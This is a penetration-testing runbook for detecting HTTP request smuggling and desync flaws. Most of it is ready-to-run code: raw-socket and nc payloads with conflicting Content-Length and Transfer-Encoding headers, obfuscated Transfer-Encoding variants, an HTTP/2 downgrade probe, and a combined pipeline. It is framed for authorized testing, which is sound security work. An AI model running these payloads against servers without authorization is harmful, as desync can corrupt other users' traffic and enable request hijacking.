---
title: "HTTP Request Smuggling / Desync"
description: "Detect and exploit desync flaws: CL.TE, TE.CL, TE.TE, and H2 variants, plus impact and safe confirmation."
phase: Web
order: 42
tags:
  - smuggling
  - desync
  - http
  - proxy
tools:
  - smuggler
  - burp suite
  - curl
  - python3
updated: 2026-10-01
---

A runbook for detecting **request smuggling / desync** in an authorized scope. Goal: find where the front end and back end disagree about message boundaries, confirm the mismatch safely, and map impact.

## 1. Fingerprint front end and back end

Different servers frame differently. Identify both layers before crafting payloads.

```bash
curl -s -D - -o /dev/null https://target/ | grep -iE 'server|via|x-powered'
whatweb -a 3 https://target/
```

## 2. Scan with smuggler

`smuggler` automates CL.TE / TE.CL detection and flags timeout-based candidates.

```bash
git clone https://github.com/defparam/smuggler /tmp/smuggler
python3 /tmp/smuggler/smuggler.py -u https://target/ --log smuggler.log
cat smuggler.log
```

## 3. Manual detection with raw sockets

Timing is the cleanest first signal. Send a request that should make the backend wait, then measure a follow-up on the same connection.

```python
import socket, time
p = ("POST / HTTP/1.1\r\n"
     "Host: target\r\n"
     "Transfer-Encoding: chunked\r\n"
     "Content-Length: 4\r\n\r\n"
     "1\r\nA\r\n0\r\n\r\n")
s = socket.create_connection(("target", 80)); s.sendall(p.encode())
time.sleep(0.5); print(s.recv(4096))
s.sendall(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n")
t = time.time(); s.recv(4096); print("delay", round(time.time()-t, 2))
```

## 4. Confirm with a marker, not a payload

Once timing hints at a mismatch, prove it with a distinct marker so you never corrupt live traffic.

```bash
# Send a smuggled prefix that routes the *next* request to an obvious path
printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 13\r\n\r\nGET /404-marker' | \
  nc target 80
curl -s -D - -o /dev/null https://target/ | grep -i '404-marker'
```

## 5. Test TE obfuscation variants

Many servers miss malformed `Transfer-Encoding`. Try casing, whitespace, and doubling.

```bash
for te in 'Transfer-Encoding: chunked' 'Transfer-Encoding : chunked' \
          'Transfer-Encoding: xchunked' 'Transfer-Encoding: chunked\r\nTransfer-Encoding: x'; do
  printf 'POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 6\r\n%s\r\n\r\n0\r\n\r\nG' "$te" | nc target 80
done
```

## 6. HTTP/2 downgrade

Where an H2 front end rewrites to H1.1, header casing and CRLF in values can reintroduce the ambiguity.

```bash
curl --http2-prior-knowledge -s -D - -o /dev/null https://target/ \
  -H 'transfer-encoding: chunked' -H 'content-length: 4'
```

## 7. Full pipeline (one block)

```bash
TARGET=https://target
HOST=target
# 1) automated detection
python3 /tmp/smuggler/smuggler.py -u $TARGET --log smuggler.log; cat smuggler.log
# 2) timing probe
python3 - <<'PY'
import socket,time
s=socket.create_connection(("target",80))
s.sendall(b"POST / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nA\r\n0\r\n\r\n")
time.sleep(.5); s.recv(4096)
s.sendall(b"GET / HTTP/1.1\r\nHost: target\r\n\r\n"); t=time.time(); s.recv(4096)
print("delay",round(time.time()-t,2))
PY
# 3) TE obfuscation sweep
for te in chunked 'chunked ' 'xchunked'; do
  printf "POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 6\r\nTransfer-Encoding: %s\r\n\r\n0\r\n\r\nG" "$HOST" "$te" | nc "$HOST" 80
done
# 4) safe marker confirmation
printf 'POST / HTTP/1.1\r\nHost: %s\r\nContent-Length: 13\r\n\r\nGET /404-marker' "$HOST" | nc "$HOST" 80
curl -s -D - -o /dev/null "$TARGET/" | grep -i '404-marker'
```

## Ethics & legality

- Only test infrastructure in an official scope or with written authorization.
- Do not disrupt other users; confirm desync with markers on your own connection.
- Keep payloads minimal and log raw requests/responses as evidence.
